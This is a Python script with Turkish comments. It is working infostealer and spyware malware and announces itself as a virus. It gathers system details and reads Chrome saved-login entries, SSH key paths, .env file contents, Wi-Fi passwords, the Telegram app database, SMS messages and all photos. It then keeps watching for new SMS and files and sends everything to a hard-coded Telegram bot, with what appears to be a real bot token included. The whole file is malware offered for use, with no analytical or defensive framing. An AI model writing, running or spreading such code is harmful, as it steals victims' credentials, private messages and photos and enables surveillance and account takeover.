import os
import time
import requests
import hashlib
import subprocess
import glob
import re
import sqlite3
import shutil
import platform
from datetime import datetime

# ======================== TELEGRAM BİLGİLERİ ========================
TOKEN = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"
ADMIN_ID = "8402048380"

# ======================== TELEGRAM GÖNDERİCİ ========================
def tg_mesaj(m):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": ADMIN_ID, "text": m[:4000]}, timeout=15)
    except:
        pass

def tg_foto(dosya):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(dosya, "rb") as f:
            requests.post(url, data={"chat_id": ADMIN_ID}, files={"photo": f}, timeout=30)
    except:
        pass

def tg_dosya(dosya):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(dosya, "rb") as f:
            requests.post(url, data={"chat_id": ADMIN_ID}, files={"document": f}, timeout=30)
    except:
        pass

# ======================== SİSTEM BİLGİSİ ========================
def sistem_bilgisi():
    try:
        sistem = platform.system()
        host = os.uname().node
        kullanici = os.getlogin()
        ip = requests.get('https://api.ipify.org', timeout=5).text
        tg_mesaj(f"💻 SİSTEM: {sistem} | {host} | {kullanici} | IP: {ip}")
    except:
        tg_mesaj("❌ Sistem bilgisi alınamadı.")

# ======================== TARAYICI ŞİFRELERİ (CHROME) ========================
def chrome_sifreleri():
    try:
        chrome_login = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        if os.path.exists(chrome_login):
            shutil.copy(chrome_login, "/tmp/chrome_login.db")
            tg_mesaj("✅ Chrome şifre dosyası bulundu ve kopyalandı.")
            try:
                conn = sqlite3.connect("/tmp/chrome_login.db")
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 15")
                for row in cursor.fetchall():
                    tg_mesaj(f"🔑 {row[0]} | {row[1]} | {row[2][:30]}")
            except:
                pass
    except:
        pass

# ======================== SSH ANAHTARLARI ========================
def ssh_anahtarlari():
    try:
        ssh_dosyalari = glob.glob(os.path.expanduser("~/.ssh/*"))
        if ssh_dosyalari:
            tg_mesaj(f"🔐 SSH: {', '.join(ssh_dosyalari)}")
    except:
        pass

# ======================== .ENV DOSYALARI ========================
def env_dosyalari():
    try:
        env_files = glob.glob(os.path.expanduser("~/**/*.env"), recursive=True)
        if env_files:
            tg_mesaj(f"⚙️ .env bulundu: {', '.join(env_files[:5])}")
            for env in env_files[:3]:
                with open(env, 'r') as f:
                    tg_mesaj(f"📄 {env}: {f.read()[:300]}")
    except:
        pass

# ======================== Wİ-Fİ ŞİFRELERİ ========================
def wifi_sifreleri():
    try:
        wifi = subprocess.check_output(["grep", "-r", "psk=", "/etc/NetworkManager/system-connections/"], text=True, stderr=subprocess.DEVNULL, timeout=5)
        tg_mesaj(f"📶 Wi-Fi: {wifi[:500]}")
    except:
        pass

# ======================== TELEGRAM VERİTABANI ========================
def telegram_veri():
    try:
        db_path = "/data/data/org.telegram.messenger/files/databases/cache4.db"
        if os.path.exists(db_path):
            shutil.copy(db_path, "/tmp/telegram.db")
            tg_dosya("/tmp/telegram.db")
            tg_mesaj("📱 Telegram veritabanı gönderildi.")
    except:
        pass

# ======================== TÜM FOTOĞRAFLARI GÖNDER ========================
def tum_fotograflar():
    foto_uzantilari = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff')
    klasorler = [
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Videos")
    ]
    tg_mesaj("📸 Tüm fotoğraflar taranıyor...")
    sayac = 0
    for klasor in klasorler:
        if not os.path.exists(klasor):
            continue
        for root, _, files in os.walk(klasor):
            for dosya in files:
                if dosya.lower().endswith(foto_uzantilari):
                    yol = os.path.join(root, dosya)
                    try:
                        tg_foto(yol)
                        sayac += 1
                        time.sleep(0.5)
                    except:
                        pass
    tg_mesaj(f"✅ Toplam {sayac} fotoğraf gönderildi.")

# ======================== SMS OKU ========================
def sms_oku():
    try:
        sonuc = subprocess.check_output(
            ["content", "query", "--uri", "content://sms/inbox", "--limit", "20"],
            stderr=subprocess.DEVNULL, timeout=10, text=True
        )
        if sonuc:
            tg_mesaj(f"📨 SMS (son 20): {sonuc[:1000]}")
        else:
            tg_mesaj("❌ SMS alınamadı. İzin kontrol et.")
    except Exception as e:
        tg_mesaj(f"❌ SMS hatası: {str(e)[:100]}")

# ======================== SMS İZLEYİCİ (GERÇEK ZAMANLI) ========================
def sms_izle():
    tg_mesaj("📨 SMS izleyici başladı. Yeni SMS'ler takip ediliyor...")
    gelenler = {}
    while True:
        try:
            sonuc = subprocess.check_output(
                ["content", "query", "--uri", "content://sms/inbox", "--sort", "date DESC", "--limit", "10"],
                stderr=subprocess.DEVNULL, timeout=10, text=True
            )
            for satir in sonuc.split('\n'):
                if "_id=" in satir and "address=" in satir and "body=" in satir:
                    sms_id = re.search(r'_id=(\d+)', satir)
                    sms_address = re.search(r'address=([^,]+)', satir)
                    sms_body = re.search(r'body=([^,]+?)(?=,|$)', satir)
                    if sms_id and sms_address and sms_body:
                        id = sms_id.group(1)
                        if id not in gelenler:
                            gelenler[id] = True
                            tg_mesaj(f"📨 YENİ SMS\n📱 {sms_address.group(1)}\n💬 {sms_body.group(1)}")
            time.sleep(5)
        except:
            time.sleep(5)

# ======================== DOSYA İZLEYİCİ ========================
def dosya_izle():
    klasorler = [
        "/sdcard/Download",
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents")
    ]
    hash_kayit = {}
    while True:
        for klasor in klasorler:
            if not os.path.exists(klasor):
                continue
            for dosya in os.listdir(klasor):
                yol = os.path.join(klasor, dosya)
                if os.path.isfile(yol):
                    try:
                        with open(yol, "rb") as f:
                            h = hashlib.md5(f.read()).hexdigest()
                        if h not in hash_kayit:
                            hash_kayit[h] = yol
                            tg_mesaj(f"📁 YENİ DOSYA: {yol}")
                            if yol.lower().endswith(('.jpg', '.png', '.jpeg', '.gif')):
                                tg_foto(yol)
                            else:
                                tg_dosya(yol)
                    except:
                        pass
        time.sleep(15)

# ======================== ANA BAŞLATICI ========================
def ana():
    tg_mesaj("🚀 VİRÜS AKTİF! TÜM VERİLER TOPLANIYOR...")
    sistem_bilgisi()
    time.sleep(2)
    chrome_sifreleri()
    time.sleep(2)
    ssh_anahtarlari()
    time.sleep(2)
    env_dosyalari()
    time.sleep(2)
    wifi_sifreleri()
    time.sleep(2)
    telegram_veri()
    time.sleep(2)
    sms_oku()
    time.sleep(2)
    tum_fotograflar()
    time.sleep(2)
    tg_mesaj("✅ TÜM VERİLER TOPLANDI. SÜREKLİ İZLEME BAŞLADI...")
    
    import threading
    threading.Thread(target=sms_izle, daemon=True).start()
    threading.Thread(target=dosya_izle, daemon=True).start()
    
    while True:
        time.sleep(60)

if __name__ == "__main__":
    ana()
